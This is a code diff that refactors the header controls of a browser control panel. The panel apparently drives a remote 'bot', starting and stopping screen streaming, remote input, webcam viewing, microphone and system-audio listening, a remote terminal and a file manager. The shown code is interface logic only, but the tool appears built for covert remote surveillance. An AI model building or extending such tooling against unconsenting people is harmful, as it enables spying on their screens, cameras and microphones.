@@ -1,67 +1,53 @@
-// frontend/client_control/js/modules/ui/header.js
+/* frontend/client_control/js/modules/ui/header.js */
 import { AppState } from '../core/states.js';
 
 export function initHeaderControls() {
+    const $ = id => document.getElementById(id);
     const actions = [
-        { id: 'btn-desktop-stream',  ref: AppState.desktop, key: 'observe', mod: 'ScreenWatch', cmds: ['start_stream', 'stop_stream'] },
-        { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'InputForge',  cmds: ['start_control', 'stop_control'] },
-        { id: 'btn-webcam-stream',   ref: AppState.webcam,  key: 'active',  mod: 'CamGaze',     cmds: ['start', 'stop'] },
-        { id: 'btn-audio-pc',        ref: AppState.audio,   key: 'output',  mod: 'AudioPulse',  cmds: ['listen_pc_on', 'listen_pc_off'] },
-        { id: 'btn-audio-mic',       ref: AppState.audio,   key: 'input',   mod: 'AudioPulse',  cmds: ['listen_mic_on', 'listen_mic_off'] }
+        { id: 'btn-desktop-stream', ref: AppState.desktop, key: 'observe', mod: 'ScreenWatch', cmds: ['start_stream', 'stop_stream'] },
+        { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'InputForge', cmds: ['start_control', 'stop_control'] },
+        { id: 'btn-webcam-stream', ref: AppState.webcam, key: 'active', mod: 'CamGaze', cmds: ['start', 'stop'] },
+        { id: 'btn-audio-pc', ref: AppState.audio, key: 'output', mod: 'AudioPulse', cmds: ['listen_pc_on', 'listen_pc_off'] },
+        { id: 'btn-audio-mic', ref: AppState.audio, key: 'input', mod: 'AudioPulse', cmds: ['listen_mic_on', 'listen_mic_off'] }
     ];
 
-    const toggleAction = (action, forceState = null, silent = false) => {
-        const btn = document.getElementById(action.id);
-        const newState = (forceState !== null) ? forceState : !action.ref[action.key];
+    const toggleAction = (a, force = null, silent = false) => {
+        const btn = $(a.id), state = force ?? !a.ref[a.key];
+        if (a.ref[a.key] === state && force === null) return;
         
-        // Если состояние не меняется - ничего не делаем
-        if (action.ref[action.key] === newState && forceState === null) return;
+        a.ref[a.key] = state;
+        btn?.classList.toggle('active', state);
 
-        action.ref[action.key] = newState;
-        if (btn) btn.classList.toggle('active', newState);
-
-        if (action.id === 'btn-desktop-control') {
-            const canvas = document.getElementById('desktopCanvas');
-            if (canvas) {
-                canvas.classList.toggle('control-active', newState);
-                if (newState) { canvas.focus(); canvas.tabIndex = 1; }
-            }
+        if (a.id === 'btn-desktop-control') {
+            const cvs = $('desktopCanvas');
+            if (cvs) { cvs.style.pointerEvents = state ? 'auto' : 'none'; state && cvs.focus(); }
         }
-
-        // Отправляем команду боту, если режим не "молчаливый"
-        if (!silent && window.sendToBot) {
-            window.sendToBot(action.mod, newState ? action.cmds[0] : action.cmds[1]);
-        }
+        !silent && window.sendToBot?.(a.mod, state ? a.cmds[0] : a.cmds[1]);
     };
 
-    const terminalBtn = document.getElementById('btn-terminal-toggle');
-    const terminalOverlay = document.getElementById('terminal-overlay');
-    
-    if (terminalBtn && terminalOverlay) {
-        terminalBtn.onclick = () => {
-            const isHidden = terminalOverlay.classList.toggle('hidden');
-            terminalBtn.classList.toggle('active', !isHidden);
+    const setupToggle = (btnId, ovlId, onOpen) => {
+        const btn = $(btnId), ovl = $(ovlId);
+        if (btn && ovl) btn.onclick = () => {
+            const isH = ovl.classList.toggle('hidden');
+            btn.classList.toggle('active', !isH);
+            !isH && onOpen?.();
         };
-    }
+    };
 
-    actions.forEach(a => {
-        const el = document.getElementById(a.id);
-        if (el) el.onclick = () => toggleAction(a);
+    setupToggle('btn-terminal-toggle', 'terminal-overlay', () => {
+        window.resetTerminalPosition?.();
+        setTimeout(() => $('terminal-cmd')?.focus(), 50);
     });
+    setupToggle('btn-files-toggle', 'files-overlay', () => window.openFileManager?.());
 
-    window.syncModeResources = (mode) => {
-        // 1. Скрываем терминал (терминал не трогаем на бэкенде, просто убираем UI)
-        if (terminalOverlay) terminalOverlay.classList.add('hidden');
-        if (terminalBtn) terminalBtn.classList.remove('active');
+    actions.forEach(a => $(a.id) && ($(a.id).onclick = () => toggleAction(a)));
 
-        // 2. Отправляем команды на остановку боту (silent = false)
-        // Проверяем состояние, чтобы не слать stop, если оно уже false
+    window.syncModeResources = mode => {
+        [$('terminal-overlay'), $('files-overlay')].forEach(el => el?.classList.add('hidden'));
+        [$('btn-terminal-toggle'), $('btn-files-toggle')].forEach(el => el?.classList.remove('active'));
         if (mode === 'webcam') {
-            if (AppState.desktop.observe) toggleAction(actions[0], false, false);
-            if (AppState.desktop.control) toggleAction(actions[1], false, false);
-        } else if (mode === 'desktop') {
-            if (AppState.webcam.active) toggleAction(actions[2], false, false);
-        }
-        // Звук (actions[3] и actions[4]) мы здесь не трогаем, как вы и просили.
+            AppState.desktop.observe && toggleAction(actions[0], false);
+            AppState.desktop.control && toggleAction(actions[1], false);
+        } else if (mode === 'desktop' && AppState.webcam.active) toggleAction(actions[2], false);
     };
 }
